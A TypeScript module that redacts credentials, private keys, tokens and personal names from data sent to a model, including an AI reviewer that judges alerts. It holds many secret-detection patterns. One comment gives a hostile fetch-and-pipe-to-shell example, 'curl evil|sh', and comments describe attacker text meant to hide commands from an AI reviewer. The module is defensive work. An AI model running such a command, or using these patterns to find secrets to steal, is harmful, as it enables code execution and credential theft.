import { hostname, userInfo } from 'node:os';

export interface RedactionOptions {
  /** The Mac's short user name, replaced wherever it appears. */
  readonly username?: string;
  /** The Mac's host name. */
  readonly hostname?: string;
  /** Upper bound for the serialized data sent to a model. */
  readonly maxBytes: number;
}

/** What a redacted value is replaced with. */
export const REDACTED = '<redacted>';

/**
 * The longest string redactString looks at. Anything past it is cut off before
 * redaction, so a hostile or runaway input can't make redaction slow.
 */
export const MAX_REDACT_CHARS = 512 * 1024;

// Every pattern here must run in time linear in its input: no unbounded
// repetition that can be retried from many start positions, and no lookahead
// that scans the rest of the string per match. redact.test.ts times each on
// adversarial input.
//
// Redacted text is also what an AI reviewer reads to judge an alert, so no
// rule may let attacker-written text hide what comes after it: each value
// stops at the first character that can't belong to it.
const SECRET_PATTERNS: ReadonlyArray<readonly [RegExp, string]> = [
  [/\b(?:AKIA|ASIA)[0-9A-Z]{16}\b/g, '<aws-key>'],
  [/\b(?:gh[pousr]_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{30,})\b/g, '<github-token>'],
  [/(?<![A-Za-z0-9_-])sk-(?:ant-|proj-)?[A-Za-z0-9_-]{20,}/g, '<api-key>'],
  [/(?<![A-Za-z0-9_-])(?:xox[abeprs]|xapp)-[A-Za-z0-9-]{10,}/g, '<slack-token>'],
  [
    /\bhooks\.slack\.com\/(services|workflows|triggers)\/[A-Za-z0-9_/-]{8,}/g,
    'hooks.slack.com/$1/<redacted>',
  ],
  // A JWT, or an unsigned one (alg "none") whose signature is empty.
  [
    /(?<![A-Za-z0-9_-])eyJ[A-Za-z0-9_-]{8,}\.(?:eyJ[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]*|[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,})/g,
    '<jwt>',
  ],
  [/\b[sr]k_(?:live|test)_[A-Za-z0-9]{10,}\b/g, '<api-key>'],
  [/(?<![A-Za-z0-9_-])AIza[0-9A-Za-z_-]{35}/g, '<api-key>'],
  [/\bnpm_[A-Za-z0-9]{36}\b/g, '<npm-token>'],
  [/(?<![A-Za-z0-9_-])glpat-[A-Za-z0-9_-]{20,}/g, '<gitlab-token>'],
  [/(?<![A-Za-z0-9_-])whsec_[A-Za-z0-9+/=]{20,}/g, '<api-key>'],
  [/(?<![A-Za-z0-9_-])hf_[A-Za-z0-9]{30,}/g, '<api-key>'],
  [/(?<![A-Za-z0-9_.-])SG\.[A-Za-z0-9_-]{16,}\.[A-Za-z0-9_-]{16,}/g, '<api-key>'],
  [/(?<![A-Za-z0-9_-])ya29\.[A-Za-z0-9_-]{20,}/g, '<oauth-token>'],
  [/(?<![A-Za-z0-9_-])shp(?:at|ss|ca|pa)_[A-Fa-f0-9]{32}/g, '<api-key>'],
  [/(?<![A-Za-z0-9_-])do[opr]_v1_[a-f0-9]{64}/g, '<api-key>'],
  [/(?<![A-Za-z0-9_-])pypi-[A-Za-z0-9_-]{50,}/g, '<api-key>'],
  // An AWS SigV4 signature, in an Authorization header or a presigned URL.
  [/\b((?:X-Amz-)?Signature=)[0-9a-f]{64}\b/gi, `$1${REDACTED}`],
  // The signature of an Azure SAS URL.
  [/([?&;]sig=)[A-Za-z0-9%+/=]{16,}/g, `$1${REDACTED}`],
  // A long bearer token outside an Authorization header. In a header, any
  // length is redacted by redactKeyedValues.
  [/\b(Bearer|Basic)[ \t]+[A-Za-z0-9._~+/=-]{16,}/gi, '$1 <token>'],
  // user:password in a URL, such as postgres://me:hunter2@db or redis://:pw@db.
  [
    /(?<![A-Za-z0-9+.-])([a-z][a-z0-9+.-]{0,30}:\/\/)[^\s/?#@:]{0,256}:[^\s/?#]{1,256}@/gi,
    '$1<credentials>@',
  ],
];

const EMAIL = /(?<![A-Za-z0-9._%+-])[A-Za-z0-9._%+-]{1,64}@[A-Za-z0-9.-]{1,255}\.[A-Za-z]{2,63}/g;

// ---------------------------------------------------------------------------
// Private keys. A key is its BEGIN line, then lines of base64 (and the PEM or
// armor headers), then its END line. Only lines that can be part of a key are
// hidden, so a fake BEGIN line can't hide the commands written after it.

const KEY_BEGIN = /-----BEGIN [A-Z0-9 ]{0,40}PRIVATE KEY(?: BLOCK)?-----/g;
const KEY_END = /-----END [A-Z0-9 ]{0,40}PRIVATE KEY(?: BLOCK)?-----/y;
const KEY_END_ANYWHERE = /-----END [A-Z0-9 ]{0,40}PRIVATE KEY(?: BLOCK)?-----/g;
// Newlines, also as JSON escapes, and indentation.
const KEY_SEP = /(?:[ \t\r\n]|\\r|\\n){0,64}/y;
const KEY_HEADER =
  /(?:Proc-Type|DEK-Info|Version|Comment|Hash|Charset):[ \t]*[^\r\n\\|;&$`]{0,100}/y;
// A line of base64; a slash may be escaped in JSON.
const KEY_LINE = /(?:[A-Za-z0-9+=]|\\?\/){1,8192}/y;
const KEY_CHECKSUM = /=[A-Za-z0-9+/]{4}/y;
/** Key lines are 64 or 70 characters, but for the last. */
const MIN_FULL_KEY_LINE = 40;
const MAX_KEY_LINES = 128;
/** A key header this close to the cut may be a real key the cut ran through. */
const CLIPPED_KEY_REACH = 16 * 1024;

function stickyLength(pattern: RegExp, text: string, at: number): number {
  pattern.lastIndex = at;
  return pattern.exec(text)?.[0].length ?? 0;
}

/** Where the key whose BEGIN line ends at `from` ends; `terminated` when its END line is there. */
function keyBodyEnd(text: string, from: number): { end: number; terminated: boolean } {
  let end = from;
  let pos = from;
  let body = false;
  for (let lines = 0; lines < MAX_KEY_LINES; lines++) {
    const at = pos + stickyLength(KEY_SEP, text, pos);
    const endLine = stickyLength(KEY_END, text, at);
    if (endLine) return { end: at + endLine, terminated: true };
    if (!body) {
      const header = stickyLength(KEY_HEADER, text, at);
      if (header) {
        pos = end = at + header;
        continue;
      }
    }
    const line = stickyLength(KEY_LINE, text, at);
    if (!line) break;
    if (line < MIN_FULL_KEY_LINE) {
      // A short line is the last of a key: END or a PGP checksum comes next,
      // or the text stops there after a full line.
      const next = at + line + stickyLength(KEY_SEP, text, at + line);
      const last =
        stickyLength(KEY_END, text, next) > 0 ||
        stickyLength(KEY_CHECKSUM, text, next) > 0 ||
        (body && next === text.length);
      if (!last) break;
    }
    body = true;
    pos = end = at + line;
  }
  return { end, terminated: false };
}

/**
 * Replace each private key with <private-key>. A key left open by the cut of
 * over-long text runs to the end of the text, but only when its BEGIN line is
 * near the cut and no END line follows it.
 */
function redactPrivateKeys(text: string, clipped: boolean): string {
  if (!text.includes('PRIVATE KEY')) return text;
  const reachFrom = text.length - CLIPPED_KEY_REACH;
  let lastEnd = -1;
  if (clipped) {
    KEY_END_ANYWHERE.lastIndex = Math.max(0, reachFrom);
    for (let m = KEY_END_ANYWHERE.exec(text); m; m = KEY_END_ANYWHERE.exec(text)) lastEnd = m.index;
  }
  let out = '';
  let last = 0;
  KEY_BEGIN.lastIndex = 0;
  for (let m = KEY_BEGIN.exec(text); m; m = KEY_BEGIN.exec(text)) {
    const afterBegin = m.index + m[0].length;
    const body = keyBodyEnd(text, afterBegin);
    let end = body.end;
    if (!body.terminated && clipped && m.index >= reachFrom && lastEnd < m.index) end = text.length;
    out += text.slice(last, m.index) + '<private-key>';
    last = end;
    KEY_BEGIN.lastIndex = end;
  }
  return last === 0 ? text : out + text.slice(last);
}

// ---------------------------------------------------------------------------
// Credential names: PGPASSWORD, x-api-key, githubToken, --db-password, ...

/** A name ending in one of these is about a secret, not the secret itself. */
const NON_SECRET_SUFFIXES = new Set([
  'count',
  'policy',
  'enabled',
  'disabled',
  'length',
  'min',
  'max',
  'required',
  'url',
  'uri',
  'file',
  'path',
  'dir',
  'type',
  'id',
  'name',
  'ttl',
  'expiry',
  'expires',
  'timeout',
  'limit',
  'at',
  'time',
  'usage',
  'strength',
  'age',
  'rate',
  'used',
  'stdin',
]);

const CREDENTIAL_WORDS = new Set([
  'pwd',
  'auth',
  'authorization',
  'apikey',
  'accesskey',
  'privatekey',
]);
const KEY_QUALIFIER_LIST = [
  'api',
  'access',
  'private',
  'account',
  'signing',
  'encryption',
  'master',
  'session',
  'client',
  'secret',
  'shared',
];
const KEY_QUALIFIERS = new Set(KEY_QUALIFIER_LIST);
const QUALIFIED_KEY = new RegExp(`(?:${KEY_QUALIFIER_LIST.join('|')})key$`);
const QUICK_CREDENTIAL = /pass|pwd|token|secret|key|auth|credential|cookie/i;

// Names repeat, often thousands of times in one result: each is split once.
const MAX_CACHED_NAMES = 1024;
const partsCache = new Map<string, readonly string[]>();

function nameParts(name: string): readonly string[] {
  let parts = partsCache.get(name);
  if (!parts) {
    parts = name
      .replace(/([a-z0-9])([A-Z])/g, '$1 $2')
      .toLowerCase()
      .split(/[^a-z0-9]+/)
      .filter(Boolean);
    if (partsCache.size >= MAX_CACHED_NAMES) partsCache.clear();
    partsCache.set(name, parts);
  }
  return parts;
}

/** True for a name that describes a secret rather than holding one: token_count, expires_at. */
function hasNonSecretSuffix(name: string): boolean {
  const parts = nameParts(name);
  return parts.length > 0 && NON_SECRET_SUFFIXES.has(parts[parts.length - 1]!);
}

/** True for a name whose value is a secret, such as MYSQL_PWD or x-api-key. */
export function isCredentialName(name: string): boolean {
  if (!QUICK_CREDENTIAL.test(name)) return false;
  const parts = nameParts(name);
  if (parts.length === 0) return false;
  // The shell's working folder, not a password.
  if (parts.length === 1 && (parts[0] === 'pwd' || parts[0] === 'oldpwd')) return false;
  if (parts.length > 1 && NON_SECRET_SUFFIXES.has(parts[parts.length - 1]!)) return false;
  return parts.some((part, i) => {
    if (/password|passwd|passphrase|secret|credential|cookie/.test(part)) return true;
    // SMTP_PASS, pass; not pass_through.
    if (part === 'pass') return i === parts.length - 1;
    // GITHUB_TOKEN, accessToken; not max_tokens.
    if (part.endsWith('token')) return true;
    if (CREDENTIAL_WORDS.has(part)) return true;
    if (QUALIFIED_KEY.test(part)) return true;
    return part === 'key' && i > 0 && KEY_QUALIFIERS.has(parts[i - 1]!);
  });
}

/** A password-like name, where even a short number is the secret (a PIN). */
function isPasswordName(name: string): boolean {
  const parts = nameParts(name);
  return parts.some(
    (part, i) =>
      /password|passwd|passphrase/.test(part) ||
      part === 'pwd' ||
      (part === 'pass' && i === parts.length - 1),
  );
}

interface NameInfo {
  readonly credential: boolean;
  readonly password: boolean;
  readonly authorization: boolean;
  readonly cookie: boolean;
}
const nameCache = new Map<string, NameInfo>();

/** What redactKeyedValues needs to know of a name, worked out once per name. */
function describeName(name: string): NameInfo {
  let info = nameCache.get(name);
  if (!info) {
    const credential = isCredentialName(name);
    const parts = credential ? nameParts(name) : [];
    info = {
      credential,
      password: credential && isPasswordName(name),
      authorization: parts.includes('authorization'),
      cookie: parts.some((p) => p.includes('cookie')),
    };
    if (nameCache.size >= MAX_CACHED_NAMES) nameCache.clear();
    nameCache.set(name, info);
  }
  return info;
}

/** Values that can't be a secret: flags and small counts. */
function isBenignValue(value: string, passwordName: boolean): boolean {
  if (value === '') return true;
  if (/^(?:true|false|null|undefined|none|yes|no|on|off)$/i.test(value)) return true;
  return !passwordName && /^-?\d{1,4}$/.test(value);
}

function isBenignNumber(value: number, passwordName: boolean): boolean {
  return !passwordName && Number.isInteger(value) && Math.abs(value) < 10_000;
}

/**
 * A name followed by its separator: NAME=, NAME: , "name": , name => , name := ,
 * --name=, or --name followed by a space and a value that isn't another flag.
 * The name is bounded and must start a word, so the work at each position is
 * bounded. npm's _authToken starts with an underscore.
 */
const KEYED =
  /(?<![A-Za-z0-9_.-])(?:(["']?)-{0,2}(_?[A-Za-z][A-Za-z0-9_.-]{0,63})(["']?)[ \t]*(===|==|=>|:=|[=:])[ \t]*|--([A-Za-z][A-Za-z0-9_-]{0,63})[ \t]+(?=[^\s-]|-(?![-\s]|[A-Za-z](?:\s|$))))/g;
// A quoted value, escapes included. An unclosed quote runs to the end of the
// line or text, so it can't be retried from later positions.
const DOUBLE_QUOTED = /"(?:[^"\\\n]|\\[\s\S])*(?:"|(?=\n)|$)/y;
const SINGLE_QUOTED = /'(?:[^'\\\n]|\\[\s\S])*(?:'|(?=\n)|$)/y;
// `hunter2`. A backtick value with spaces is a command, left to be read.
const BACKTICK_QUOTED = /`[^`\s]{1,256}`/y;
const UNTIL_DOUBLE = /(?:[^"\\\n]|\\[\s\S])*/y;
const UNTIL_SINGLE = /[^'\n]*/y;
// A bare value stops where JSON, a query string or a shell would end it.
const BARE = /[^\s,;&|}\])"'`]+/y;
const AUTH_SCHEME = /(?:Bearer|Basic|Token|Digest|Negotiate|NTLM|AWS4-HMAC-SHA256)[ \t]+/iy;
// A cookie header's value: name=value pairs joined by "; ". It stops at a
// newline and at anything a shell would act on, so `Cookie: x; curl evil|sh`
// keeps the curl in view.
const COOKIE_CHARS = String.raw`[^\r\n|&;\`$\\QUOTE]|\$(?!\()|;(?=[ \t]*[A-Za-z0-9!#%*+.^_~-]{1,64}=)`;
const COOKIE_VALUE: Readonly<Record<string, RegExp>> = {
  '': new RegExp(`(?:${COOKIE_CHARS.replace('QUOTE', '')})*`, 'y'),
  '"': new RegExp(`(?:${COOKIE_CHARS.replace('QUOTE', '"')})*`, 'y'),
  "'": new RegExp(`(?:${COOKIE_CHARS.replace('QUOTE', "'")})*`, 'y'),
};

function matchAt(pattern: RegExp, text: string, at: number): string {
  pattern.lastIndex = at;
  return pattern.exec(text)?.[0] ?? '';
}

/** The value that starts at `at`, by the rules for the name before it. */
function valueAt(text: string, at: number, argQuote: string, cookie: boolean): string {
  if (cookie) return matchAt(COOKIE_VALUE[argQuote]!, text, at).trimEnd();
  if (argQuote === '"') return matchAt(UNTIL_DOUBLE, text, at);
  if (argQuote === "'") return matchAt(UNTIL_SINGLE, text, at);
  if (text[at] === '"') return matchAt(DOUBLE_QUOTED, text, at);
  if (text[at] === "'") return matchAt(SINGLE_QUOTED, text, at);
  if (text[at] === '`') return matchAt(BACKTICK_QUOTED, text, at);
  return matchAt(BARE, text, at);
}

function unquote(value: string): string {
  const q = value[0];
  return (q === '"' || q === "'" || q === '`') && value.length >= 2 && value.endsWith(q)
    ? value.slice(1, -1)
    : value;
}

// ---------------------------------------------------------------------------
// YAML: `password:` with its value on the lines below, or a block scalar.
//
//   password:            private_key: |           tokens:
//     hunter2              -----BEGIN ...         - abc

const BLOCK_SCALAR = /[|>][-+]?[1-9]?[-+]?[ \t]*(?=\r?\n)/y;
const MAPPING_LINE = /["']?[A-Za-z0-9_.-]{1,64}["']?[ \t]*:(?:[ \t]|\r?$)/;
const MAX_BLOCK_LINES = 256;

/**
 * The value lines after the line break at `from`: lines indented past `column`,
 * or `- item` lines at `column`. Undefined when there are none, or when they
 * are a nested mapping, whose own names are checked as the scan reaches them.
 */
function indentedBlock(
  text: string,
  from: number,
  column: number,
  scalar: boolean,
): { start: number; end: number } | undefined {
  let pos = from;
  let start = -1;
  let end = -1;
  let list = false;
  for (let lines = 0; lines < MAX_BLOCK_LINES; lines++) {
    if (text[pos] === '\r') pos++;
    if (text[pos] !== '\n') break;
    const lineStart = ++pos;
    while (text[pos] === ' ' || text[pos] === '\t') pos++;
    const indent = pos - lineStart;
    const contentStart = pos;
    const newline = text.indexOf('\n', pos);
    let lineEnd = newline < 0 ? text.length : newline;
    pos = lineEnd;
    if (lineEnd > contentStart && text[lineEnd - 1] === '\r') lineEnd--;
    if (lineEnd <= contentStart) continue; // A blank line inside the block.
    const item = text[contentStart] === '-' && /[ \t\r\n]/.test(text[contentStart + 1] ?? '\n');
    if (start < 0) {
      if (indent > column) {
        if (!scalar && MAPPING_LINE.test(text.slice(contentStart, lineEnd))) return undefined;
      } else if (indent === column && item && !scalar) {
        list = true;
      } else {
        return undefined;
      }
      // `- item`: the dash stays.
      start = list ? contentStart + (text[contentStart + 1] === '\n' ? 1 : 2) : contentStart;
    } else if (indent < column || (indent === column && !(list && item))) {
      break;
    }
    end = lineEnd;
  }
  return start < 0 ? undefined : { start, end };
}

/**
 * Redact the value of every credential-named setting, whatever its length:
 * PGPASSWORD=x, "password": "x", x-api-key: x, --token x, Authorization: Bearer x.
 * One pass, each value read once.
 */
function redactKeyedValues(text: string): string {
  let out = '';
  let last = 0;
  KEYED.lastIndex = 0;
  for (let m = KEYED.exec(text); m; m = KEYED.exec(text)) {
    const name = describeName(m[2] ?? m[5]!);
    if (!name.credential) continue;
    const afterKey = m.index + m[0].length;
    const lead = m[1] ?? '';
    // 'x-api-key: abc' — the quote opens the shell argument, so the value runs
    // up to its closing quote and the quote stays.
    const argQuote = lead && !m[3] ? lead : '';
    let at = afterKey;
    if (name.authorization) at += matchAt(AUTH_SCHEME, text, at).length;
    // "auth": { ... } — the names inside are checked on their own.
    if (text[at] === '{' || text[at] === '[') continue;
    if (m[4] === ':' && !argQuote) {
      const scalar = matchAt(BLOCK_SCALAR, text, at).length;
      if (scalar || text[at] === '\n' || text[at] === '\r') {
        const column = m.index - (text.lastIndexOf('\n', m.index - 1) + 1);
        const block = indentedBlock(text, at + scalar, column, scalar > 0);
        if (block) {
          out += text.slice(last, block.start) + REDACTED;
          last = block.end;
          KEYED.lastIndex = last;
        }
        continue;
      }
    }
    const cookieHeader = m[4] === ':' && name.cookie;
    const value = valueAt(text, at, argQuote, cookieHeader);
    const bare = unquote(value);
    // Already replaced by a pattern above, such as <api-key>: keep the more telling marker.
    if (!value || /^<[a-z-]+>$/.test(bare) || isBenignValue(bare, name.password)) continue;
    out += text.slice(last, at) + REDACTED;
    last = at + value.length;
    KEYED.lastIndex = last;
  }
  return last === 0 ? text : out + text.slice(last);
}

// ---------------------------------------------------------------------------
// `password hunter2`, as in .netrc, where the value follows a space. The words
// that follow "password" in a sentence are left alone.

// The value can't start like a separator (password => x) or a flag.
const PASSWORD_WORD =
  /(?<![A-Za-z0-9_./\\-])(pass(?:word|phrase))([ \t]+)([^\s,;&|}\])"'`<>=:({[-][^\s,;&|}\])"'`<>]*)/gi;
const PROSE_AFTER_PASSWORD = new Set(
  (
    'a an the is are was were be been being for to and or of in on at by with from as it its this that ' +
    'these those not no must should will would can could cannot may might has have had does did do ' +
    'reset resets change changed changes expired expires expiry required prompt prompts manager ' +
    'managers field fields policy policies hash hashes hashed hashing file files protected protection ' +
    'authentication auth login please here again below above incorrect invalid wrong mismatch strength ' +
    'length set update updated entry entered input box dialog attempt attempts failed failure accepted ' +
    'rejected too if when then but so used use using based only via without store stored storage ' +
    'vault spraying spray guessing cracking brute dump dumping list lists recovery rotation history hint ' +
    'sync complexity requirements requirement rules rule protect matches match needed need sent '
  )
    .trim()
    .split(/\s+/),
);

function redactPasswordWords(text: string): string {
  return text.replace(PASSWORD_WORD, (whole, name: string, space: string, value: string) =>
    value.startsWith('<') ||
    PROSE_AFTER_PASSWORD.has(value.toLowerCase()) ||
    isBenignValue(value, true)
      ? whole
      : `${name}${space}${REDACTED}`,
  );
}

// ---------------------------------------------------------------------------
// Passwords given as command-line flags by tools that take them that way.
// Each command runs to the end of its line or pipeline stage, read once.

const CURL_COMMAND = /\bcurl\b[^\n;|&]*/g;
const SSHPASS_COMMAND = /\bsshpass\b[^\n;|&]*/g;
const DOCKER_COMMAND = /\bdocker\b[^\n;|&]*/g;
const OPENSSL_COMMAND = /\bopenssl\b[^\n;|&]*/g;
const MYSQL_COMMAND = /\b(?:mysql|mariadb)[a-z]*\b[^\n;|&]*/g;
// curl -u user:pass, --user user:pass, -uuser:pass.
const CURL_USER =
  /(\s(?:-u[ \t]*|--user(?:[ \t]+|=)))(?:(["'])([^"'\n:]{0,256}):[^"'\n]{1,512}\2|([^\s"':]{0,256}):[^\s"']{1,512})/g;
// sshpass -p pw, docker login -p pw: the first -p only, as later ones belong
// to the command sshpass runs.
const DASH_P = /(\s-p[ \t]*)("[^"\n]*"|'[^'\n]*'|[^\s"'-]\S*)/;
const OPENSSL_SECRET =
  /(\s(?:-[kK][ \t]+|-pass(?:in|out)?[ \t]+pass:))("[^"\n]*"|'[^'\n]*'|[^\s"']+)/g;
// mysql -phunter2. For the MySQL tools, which take the password glued to -p:
// elsewhere -p is a port (ssh -p 22) or a plain flag (mkdir -p).
const MYSQL_GLUED_PASSWORD = /(\s-p)[^\s-]\S*/g;

function redactCommandSecrets(text: string): string {
  return text
    .replace(CURL_COMMAND, (command) =>
      command.replace(
        CURL_USER,
        (_whole, flag: string, quote: string | undefined, quotedUser: string, user: string) =>
          quote ? `${flag}${quote}${quotedUser}:${REDACTED}${quote}` : `${flag}${user}:${REDACTED}`,
      ),
    )
    .replace(SSHPASS_COMMAND, (command) => command.replace(DASH_P, `$1${REDACTED}`))
    .replace(DOCKER_COMMAND, (command) =>
      /\slogin\b/.test(command) ? command.replace(DASH_P, `$1${REDACTED}`) : command,
    )
    .replace(OPENSSL_COMMAND, (command) => command.replace(OPENSSL_SECRET, `$1${REDACTED}`))
    .replace(MYSQL_COMMAND, (command) => command.replace(MYSQL_GLUED_PASSWORD, `$1${REDACTED}`));
}

// ---------------------------------------------------------------------------
// XML: <password>x</password>, and <add key="StripeApiKey" value="x" />.

const XML_ELEMENT =
  /<((?:[A-Za-z_][\w.-]{0,63}:)?([A-Za-z_][\w.-]{0,63}))(\s[^<>]*)?>([^<]*)<\/\1>/g;
const XML_KEYED_ATTRIBUTE =
  /\b((?:key|name)=)(["'])([^"'\n<>]{1,128})\2(\s+value=)(["'])([^"'\n]*)\5/gi;

function redactXml(text: string): string {
  if (!text.includes('<') && !text.includes('=')) return text;
  return text
    .replace(
      XML_ELEMENT,
      (whole, tag: string, local: string, attrs: string | undefined, body: string) =>
        isCredentialName(local) && !isBenignValue(body.trim(), isPasswordName(local))
          ? `<${tag}${attrs ?? ''}>${REDACTED}</${tag}>`
          : whole,
    )
    .replace(
      XML_KEYED_ATTRIBUTE,
      (whole, attr: string, q: string, key: string, sep: string, vq: string, value: string) =>
        isCredentialName(key) && !isBenignValue(value, isPasswordName(key))
          ? `${attr}${q}${key}${q}${sep}${vq}${REDACTED}${vq}`
          : whole,
    );
}

// ---------------------------------------------------------------------------
// Secrets hidden in base64, such as {"password":"hunter2"} encoded. A run may
// follow an equals sign, as in data=eyJ...
const BASE64_RUN = /(?<![A-Za-z0-9+/_-])[A-Za-z0-9+/_-]{16,}={0,2}/g;
const MAX_BASE64_RUN = 16 * 1024;
const DECODED_SECRET =
  /pass(?:word|wd)|secret|token|api[_-]?key|access[_-]?key|private[_-]?key|credential|authorization|"alg"\s*:/i;

function hidesSecret(run: string): boolean {
  if (run.length > MAX_BASE64_RUN) return false;
  const decoded = Buffer.from(run, 'base64').toString('latin1');
  if (decoded.length < 8) return false;
  let printable = 0;
  for (let i = 0; i < decoded.length; i++) {
    const c = decoded.charCodeAt(i);
    if ((c >= 0x20 && c < 0x7f) || c === 0x0a || c === 0x0d || c === 0x09) printable++;
  }
  return printable / decoded.length >= 0.9 && DECODED_SECRET.test(decoded);
}

// ---------------------------------------------------------------------------
// The cut for over-long input.

/** How far back the cut looks for whitespace before it settles for punctuation. */
const CUT_WINDOW = 1024;

function isWhitespace(code: number): boolean {
  return code <= 0x20;
}

function isBoundary(code: number): boolean {
  // Whitespace, quotes and the punctuation that ends a value in JSON or a shell.
  return (
    code <= 0x20 ||
    code === 0x22 || // "
    code === 0x27 || // '
    code === 0x60 || // `
    code === 0x2c || // ,
    code === 0x3b || // ;
    code === 0x28 || // (
    code === 0x29 || // )
    code === 0x5b || // [
    code === 0x5d || // ]
    code === 0x7b || // {
    code === 0x7d || // }
    code === 0x3c || // <
    code === 0x3e // >
  );
}

// A URL whose user:password the cut ran through, before its @.
const PARTIAL_URL_AUTHORITY = /([a-z][a-z0-9+.-]{0,30}:\/\/)[^\s/?#@]*$/i;

/**
 * Cut text past MAX_REDACT_CHARS, along with the word the cut runs through,
 * so no secret is left with its head on one side and only a tail to see. The
 * cut goes back to whitespace; text with none nearby, such as minified JSON,
 * is cut at punctuation, and a URL whose credentials the cut ran into loses
 * them. A quoted value or private key left open by the cut is redacted to the
 * end later.
 */
function clip(input: string): { text: string; dropped: number } {
  if (input.length <= MAX_REDACT_CHARS) return { text: input, dropped: 0 };
  let end = MAX_REDACT_CHARS;
  const floor = Math.max(0, end - CUT_WINDOW);
  let space = end;
  while (space > floor && !isWhitespace(input.charCodeAt(space - 1))) space--;
  let text: string;
  if (space > floor) {
    end = space;
    text = input.slice(0, end);
  } else {
    while (end > 0 && !isBoundary(input.charCodeAt(end - 1))) end--;
    text = input.slice(0, end);
    const tailFrom = Math.max(0, end - 2 * CUT_WINDOW);
    const tail = text.slice(tailFrom);
    const partial = PARTIAL_URL_AUTHORITY.exec(tail);
    if (partial && partial[0].length > partial[1]!.length) {
      text = text.slice(0, tailFrom + partial.index) + partial[1] + REDACTED;
    }
  }
  return { text, dropped: input.length - end };
}

function escapeRegExp(text: string): string {
  return text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

/** Names too short or too common to replace without mangling ordinary words. */
const GENERIC_NAMES = new Set(['root', 'user', 'admin', 'administrator', 'guest', 'localhost']);

function worthHiding(name: string | undefined): name is string {
  return !!name && name.length >= 3 && !GENERIC_NAMES.has(name.toLowerCase());
}

/** This Mac's user and host names, for the redaction of what leaves it. */
export function localNames(): { username?: string; hostname?: string } {
  let username: string | undefined;
  try {
    username = userInfo().username;
  } catch {
    // No account entry for this uid: there's no name to hide.
  }
  const host = hostname();
  return {
    ...(worthHiding(username) ? { username } : {}),
    ...(worthHiding(host) ? { hostname: host } : {}),
  };
}

export function redactString(input: string, options: Omit<RedactionOptions, 'maxBytes'>): string {
  const { text, dropped } = clip(input);
  let out = text.replace(/\/(Users|home)\/[^/\s"']+/g, '/$1/<user>');
  out = redactPrivateKeys(out, dropped > 0);
  for (const [pattern, replacement] of SECRET_PATTERNS) out = out.replace(pattern, replacement);
  out = redactCommandSecrets(out);
  out = redactXml(out);
  out = redactKeyedValues(out);
  out = redactPasswordWords(out);
  out = out.replace(BASE64_RUN, (run) => (hidesSecret(run) ? '<base64-secret>' : run));
  out = out.replace(EMAIL, '<email>');
  if (worthHiding(options.hostname)) {
    out = out.replace(new RegExp(escapeRegExp(options.hostname), 'gi'), '<host>');
    // Alexs-MacBook-Pro.local is often written without its domain.
    const short = options.hostname.split('.')[0];
    if (short !== options.hostname && worthHiding(short)) {
      out = out.replace(
        new RegExp(`(?<![A-Za-z0-9_-])${escapeRegExp(short)}(?![A-Za-z0-9_-])`, 'gi'),
        '<host>',
      );
    }
  }
  if (worthHiding(options.username)) {
    out = out.replace(new RegExp(`\\b${escapeRegExp(options.username)}\\b`, 'gi'), '<user>');
  }
  return dropped ? `${out}…[truncated ${dropped} characters before redaction]` : out;
}

/** Deeper than this, a value is replaced whole rather than walked. */
const MAX_DEPTH = 64;

/**
 * Redact every string in a JSON-like value. Keys are kept. A value under a
 * credential-named key (password, x-api-key, authToken, ...) is replaced
 * whatever it looks like; when that value is an object or array, its shape is
 * kept and every string and number inside it is replaced, booleans and null
 * aside, and numbers under names like expires_at. A value nested too deep, a
 * cycle, or one that throws when read is replaced whole.
 */
export function redactValue(value: unknown, options: Omit<RedactionOptions, 'maxBytes'>): unknown {
  return redactWithin(value, options, undefined, 0, new Set());
}

/** `secret` is set under a credential-named key: true when it names a password. */
function redactWithin(
  value: unknown,
  options: Omit<RedactionOptions, 'maxBytes'>,
  secret: { password: boolean } | undefined,
  depth: number,
  ancestors: Set<object>,
): unknown {
  if (secret) {
    if (typeof value === 'string') return isBenignValue(value, secret.password) ? value : REDACTED;
    if (typeof value === 'number') return isBenignNumber(value, secret.password) ? value : REDACTED;
    if (typeof value === 'bigint') return REDACTED;
  }
  if (typeof value === 'string') return redactString(value, options);
  if (!value || typeof value !== 'object') return value;
  if (depth >= MAX_DEPTH || ancestors.has(value)) return REDACTED;
  ancestors.add(value);
  try {
    if (Array.isArray(value)) {
      return value.map((item) => redactWithin(item, options, secret, depth + 1, ancestors));
    }
    const out: Record<string, unknown> = {};
    for (const [key, item] of Object.entries(value)) {
      if (secret && typeof item === 'number' && hasNonSecretSuffix(key)) {
        out[key] = item;
        continue;
      }
      const keyed =
        secret || isCredentialName(key)
          ? { password: !!secret?.password || isPasswordName(key) }
          : undefined;
      out[key] = redactWithin(item, options, keyed, depth + 1, ancestors);
    }
    return out;
  } catch {
    // A getter or proxy that throws: nothing of it is passed on.
    return REDACTED;
  } finally {
    ancestors.delete(value);
  }
}

/**
 * Redact and serialize, cutting the text at maxBytes with a visible marker.
 * The cut never splits a character or leaves half a redaction marker.
 */
export function redactAndSerialize(value: unknown, options: RedactionOptions): string {
  const text = JSON.stringify(redactValue(value, options), null, 1) ?? 'null';
  const bytes = Buffer.byteLength(text, 'utf8');
  if (bytes <= options.maxBytes) return text;
  const buffer = Buffer.from(text, 'utf8');
  let end = Math.max(0, options.maxBytes);
  // Back up to the first byte of a character the cut runs through.
  while (end > 0 && (buffer[end]! & 0xc0) === 0x80) end--;
  const cut = buffer
    .subarray(0, end)
    .toString('utf8')
    .replace(/<[a-z-]{0,30}$/, '');
  return `${cut}\n…[truncated ${bytes - Buffer.byteLength(cut, 'utf8')} bytes]`;
}
